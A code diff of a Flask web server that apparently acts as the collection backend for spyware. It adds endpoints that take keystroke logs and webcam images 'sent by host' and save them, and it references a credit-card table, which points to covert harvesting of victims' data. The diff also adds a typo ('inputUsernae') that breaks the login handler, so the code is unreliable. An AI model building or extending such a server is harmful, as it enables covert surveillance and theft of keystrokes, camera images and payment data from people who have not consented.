@@ -1,7 +1,9 @@
 from flask import Flask, json, jsonify, request, render_template
 from middleware_db import ConnectDB
+import os.path as path
+import os
+import uuid
 import ast  # used to convert json object from <unicode> to <dict> type
-
 app = Flask(__name__)
 connObj = ConnectDB()   # Obtain a DB connection enabled object.
                         # This obj will come from middleware_db.py file
@@ -15,7 +17,7 @@ def homepage():
 @app.route('/api_login', methods=['POST'])
 def login_check():
     login_form_data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
-    username = login_form_data['inputUsername']
+    username = login_form_data['inputUsernae']
     password = login_form_data['inputPassword']
     # print username, password
     login_json = {
@@ -198,7 +200,7 @@ def changePass():
 
 
 # Endpoint for updating logs in database
-@app.route('/update_key_logs', methods=['POST'])
+@app.route('/api/post_keylogs/', methods=['POST'])
 def update_key_logs():
     # For posting form data to DB
 
@@ -224,23 +226,23 @@ def update_key_logs():
 
 
 # Endpoint for updating webcam capture in database
-@app.route('/update_webcam_capture', methods=['POST'])
+@app.route('/update_webcam_capture/', methods=['POST'])
 def insert_webcam_capture():
-    # For posting form data to DB
-    data = ast.literal_eval(json.dumps(request.json, ensure_ascii=False))
-    data_temp = {"u_id": data['u_id']}
-    resultSet = connObj.NewSelect('credit_card', data_temp)
-    if resultSet.__len__() == 0:
-        resultSet = connObj.NewInsert('webcam_capture', data)
-    else:
-        resultSet = connObj.NewUpdate('webcam_capture', data)
+    # For fetching form request(images) sent by host
+    file = request.files['media']
+    fname = str(file)
+    file_name = str(uuid.uuid4())
+    # if image folder is not there create one
+    if not path.exists('Webcam_Images\\'):
+        os.makedirs('Webcam_Images\\')
 
-    # print resultSet
-    if resultSet == 'error':
-        error = {
-            "message": "Error"
-        }
-        return jsonify(error)
+    if not path.exists('Webcam_Images\\' + file_name):
+        if fname.__contains__('.jpeg'):
+            file.save('Webcam_Images\\' + file_name + '.jpeg')
+        elif fname.__contains__('.png'):
+            file.save('Webcam_Images\\' + file_name + '.png')
+        else:
+            file.save('Webcam_Images\\' + file_name + '.png')
 
     success = {
         "message": "Success"
